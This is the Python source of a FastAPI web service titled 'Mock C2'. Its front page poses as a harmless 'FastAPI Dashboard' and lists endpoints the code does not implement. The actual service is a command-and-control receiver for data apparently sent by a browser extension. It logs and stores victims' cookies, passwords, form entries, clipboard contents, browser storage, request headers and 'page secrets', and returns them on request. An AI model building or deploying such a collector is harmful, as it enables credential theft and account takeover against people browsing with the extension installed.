import json
import datetime
import logging
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from datetime import datetime
import httpx, platform, sys

# Configure Vercel-compatible logging
logging.basicConfig(level=logging.INFO, format='%(message)s')

app = FastAPI(title="Mock C2", docs_url="/docs")

# ── HTML dashboard ────────────────────────────────────────────────────────
DASHBOARD = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>FastAPI Dashboard</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; padding: 2rem; }
  h1   { font-size: 1.8rem; color: #38bdf8; margin-bottom: 0.25rem; }
  p.sub { color: #64748b; margin-bottom: 2rem; font-size: 0.9rem; }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 2rem; }
  .card { background: #1e293b; border-radius: 10px; padding: 1.25rem; }
  .card h2 { font-size: 0.75rem; color: #64748b; text-transform: uppercase; letter-spacing: 0.05em; }
  .card p  { font-size: 1.5rem; font-weight: 700; color: #38bdf8; margin-top: 0.25rem; }
  table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 10px; overflow: hidden; }
  th, td { padding: 0.75rem 1rem; text-align: left; font-size: 0.875rem; }
  th { background: #0f172a; color: #64748b; font-weight: 600; }
  tr:not(:last-child) td { border-bottom: 1px solid #0f172a; }
  a  { color: #38bdf8; text-decoration: none; }
  a:hover { text-decoration: underline; }
</style>
</head>
<body>
<h1>FastAPI Dashboard</h1>
<p class="sub">Deployed on Vercel &mdash; <span id="ts"></span></p>
<div class="grid">
  <div class="card"><h2>Status</h2><p>&#x2705; Online</p></div>
  <div class="card"><h2>Framework</h2><p>FastAPI</p></div>
  <div class="card"><h2>Platform</h2><p>Vercel</p></div>
</div>
<table>
  <tr><th>Endpoint</th><th>Method</th><th>Description</th></tr>
  <tr><td><a href="/api/health">/api/health</a></td><td>GET</td><td>Health check + server info</td></tr>
  <tr><td><a href="/api/headers-check?url=https://example.com">/api/headers-check</a></td><td>GET</td><td>Check HTTP security headers of a URL</td></tr>
  <tr><td><a href="/api/docs">/api/docs</a></td><td>GET</td><td>Swagger UI</td></tr>
</table>
<script>document.getElementById("ts").textContent = new Date().toLocaleString();</script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse, include_in_schema=False)
async def dashboard():
    return DASHBOARD

# Allow requests from chrome-extension:// origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["POST", "OPTIONS"],
    allow_headers=["*"],
)

# ── Console colours (Will show in Vercel Logs) ────────────────────────────
RESET = "\033[0m"
RED   = "\033[91m"
YELLOW= "\033[93m"
CYAN  = "\033[96m"
GREEN = "\033[92m"
GREY  = "\033[90m"
BOLD  = "\033[1m"

KIND_COLOR = {
    "cookies":               RED,
    "extensions":            YELLOW,
    "network_headers":       YELLOW,
    "network_headers_final": YELLOW,
    "sensitive_url":         RED,
    "visited_urls":          GREY,
    "storage_dump":          CYAN,
    "form_capture":          RED + BOLD,
    "form_capture_passive":  RED,
    "password_fields":       RED + BOLD,
    "clipboard":             YELLOW,
    "page_secrets":          RED + BOLD,
}

def summarise(kind: str, payload: dict | list) -> str:
    lines = []
    if kind == "cookies" and isinstance(payload, dict):
        lines.append(f"  total in profile : {payload.get('total', '?')}")
        lines.append(f"  interesting hits : {payload.get('hits', '?')}")
        for c in payload.get("sample", [])[:5]:
            lines.append(f"    [{c['domain']}] {c['name']} = {c['value_preview']}  (httpOnly={c['httpOnly']})")
    elif kind == "extensions" and isinstance(payload, list):
        lines.append(f"  installed count  : {len(payload)}")
        for e in payload[:8]:
            lines.append(f"    {e['name']} v{e['version']} (enabled={e['enabled']})")
    elif kind in ("form_capture", "form_capture_passive") and isinstance(payload, dict):
        lines.append(f"  url   : {payload.get('url', '?')}")
        for k, v in payload.get("fields", {}).items():
            lines.append(f"  field [{k}] = {str(v)[:60]}")
    elif kind == "storage_dump" and isinstance(payload, dict):
        ls = payload.get("localStorage", {})
        ss = payload.get("sessionStorage", {})
        lines.append(f"  url            : {payload.get('url', '?')}")
        lines.append(f"  localStorage   : {len(ls)} keys")
        lines.append(f"  sessionStorage : {len(ss)} keys")
        for k in list(ls.keys())[:4]:
            lines.append(f"    ls[{k}] = {str(ls[k])[:60]}")
    elif kind == "page_secrets" and isinstance(payload, dict):
        lines.append(f"  url : {payload.get('url', '?')}")
        for s in payload.get("secrets", []):
            lines.append(f"  [{s['name']}] {s['preview']}")
    elif kind == "clipboard" and isinstance(payload, dict):
        lines.append(f"  url     : {payload.get('url', '?')}")
        lines.append(f"  content : {payload.get('preview', '')}")
    elif kind == "sensitive_url" and isinstance(payload, dict):
        lines.append(f"  url : {payload.get('url', '?')}")
    elif kind in ("network_headers", "network_headers_final") and isinstance(payload, list):
        for req in payload[:3]:
            lines.append(f"  {req.get('method')} {str(req.get('url', ''))[:80]}")
            for h in req.get("headers", []):
                lines.append(f"    {h['name']}: {h['value_preview']}")
    else:
        lines.append("  " + json.dumps(payload, ensure_ascii=False)[:400])
    return "\n".join(lines)


# ── In-memory store (WARNING: Will reset frequently on Vercel) ────────────
captured: list[dict] = []

@app.post("/ingest")
async def ingest(request: Request):
    try:
        obj = await request.json()
    except Exception:
        return JSONResponse({"ok": False, "error": "invalid JSON"}, status_code=400)

    # Instead of logging to a file, log the raw JSON to Vercel's system logs
    logging.info(f"RAW_PAYLOAD: {json.dumps(obj, ensure_ascii=False)}")

    captured.append(obj)

    kind    = obj.get("kind", "unknown")
    payload = obj.get("payload", {})
    run_id  = str(obj.get("run", "?"))[:8]
    ts_raw  = obj.get("ts", 0)
    ts      = datetime.fromtimestamp(ts_raw / 1000).strftime("%H:%M:%S")
    color   = KIND_COLOR.get(kind, CYAN)

    # Log the summary format to Vercel
    logging.info(f"\n{color}{BOLD}[{ts}] RECV kind={kind}  run={run_id}{RESET}")
    summary = summarise(kind, payload)
    if summary:
        logging.info(summary)

    return {"ok": True}

@app.get("/data")
async def get_data(kind: str | None = None):
    """Return captured entries, optionally filtered by kind."""
    if kind:
        return [e for e in captured if e.get("kind") == kind]
    return captured

@app.delete("/data")
async def clear_data():
    """Clear in-memory capture list."""
    captured.clear()
    return {"ok": True, "cleared": True}

@app.get("/health")
async def health():
    return {"status": "ok", "captured": len(captured)}

from mangum import Mangum
handler = Mangum(app, lifespan="off")